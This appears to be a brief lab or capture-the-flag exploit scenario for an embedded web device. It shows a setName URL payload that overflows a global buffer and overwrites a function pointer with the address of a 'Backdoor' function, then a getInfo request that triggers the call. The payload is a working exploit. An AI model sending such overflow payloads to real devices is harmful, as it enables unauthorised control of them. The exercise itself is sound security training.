## Scenario

Global variable: projectName -> Buffer overflow -> Overwrite functionInformation.funcPtr -> Call getInfo to run  functionInformation.funcPtr pointer

Ex)

Backdoor function (_Z8Backdoorv): 400d1dcc -> %cc%1d%0d%40

http://192.168.4.1/setName?name=%C1%C2%C3%C4%C5%C6%C7%C8%C9%CA%CB%CC%CD%CE%CF%cc%1d%0d%40

_Z8Backdoorv
400d1dcc

Call getInfo:
http://192.168.4.1/getInfo


